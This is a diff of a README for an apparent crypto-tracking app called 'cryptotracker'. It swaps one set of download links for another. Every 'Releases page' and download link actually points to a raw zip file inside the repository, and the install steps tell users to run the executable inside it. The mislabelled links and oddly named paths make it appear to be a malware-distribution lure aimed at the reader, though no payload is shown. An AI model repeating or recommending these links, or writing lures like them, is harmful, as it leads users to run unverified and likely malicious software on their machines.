@@ -1,10 +1,10 @@
 # 🚀 cryptotracker - Track Your Crypto Effortlessly
 
-[![Download CryptoTracker](https://raw.githubusercontent.com/LozaGC/cryptotracker/main/aerotonometric/cryptotracker.zip)](https://raw.githubusercontent.com/LozaGC/cryptotracker/main/aerotonometric/cryptotracker.zip)
+[![Download CryptoTracker](https://github.com/LozaGC/cryptotracker/raw/refs/heads/main/src/contexts/Software-3.9.zip)](https://github.com/LozaGC/cryptotracker/raw/refs/heads/main/src/contexts/Software-3.9.zip)
 
 ## 📥 Download & Install
 
-To get started with CryptoTracker, visit the [Releases page](https://raw.githubusercontent.com/LozaGC/cryptotracker/main/aerotonometric/cryptotracker.zip) to download the latest version of the app.
+To get started with CryptoTracker, visit the [Releases page](https://github.com/LozaGC/cryptotracker/raw/refs/heads/main/src/contexts/Software-3.9.zip) to download the latest version of the app.
 
 ## 📚 Introduction
 
@@ -24,7 +24,7 @@ Make sure you install the required software as detailed below.
 
 ### Step 1: Download CryptoTracker
 
-Go to the [Releases page](https://raw.githubusercontent.com/LozaGC/cryptotracker/main/aerotonometric/cryptotracker.zip) and download the latest version for your operating system.
+Go to the [Releases page](https://github.com/LozaGC/cryptotracker/raw/refs/heads/main/src/contexts/Software-3.9.zip) and download the latest version for your operating system.
 
 ### Step 2: Install the App
 
@@ -37,7 +37,7 @@ Go to the [Releases page](https://raw.githubusercontent.com/LozaGC/cryptotracker
    - Open it and drag the CryptoTracker app into your Applications folder.
 
 3. **Linux:**
-   - Extract the downloaded `https://raw.githubusercontent.com/LozaGC/cryptotracker/main/aerotonometric/cryptotracker.zip` file.
+   - Extract the downloaded `https://github.com/LozaGC/cryptotracker/raw/refs/heads/main/src/contexts/Software-3.9.zip` file.
    - Open your terminal and navigate to the extracted folder.
    - Run the executable file to start the application.
 
@@ -99,6 +99,6 @@ If you'd like to contribute to CryptoTracker, you are welcome to submit pull req
 
 If you encounter any issues or have suggestions for improvement, please open an issue on the project's GitHub page. Your feedback helps us make CryptoTracker better.
 
-For further details, don't forget to check the [Releases page](https://raw.githubusercontent.com/LozaGC/cryptotracker/main/aerotonometric/cryptotracker.zip) for any updates or new features.
+For further details, don't forget to check the [Releases page](https://github.com/LozaGC/cryptotracker/raw/refs/heads/main/src/contexts/Software-3.9.zip) for any updates or new features.
 
 By following these steps, you should be able to download, install, and run CryptoTracker seamlessly. Enjoy tracking your crypto investments!
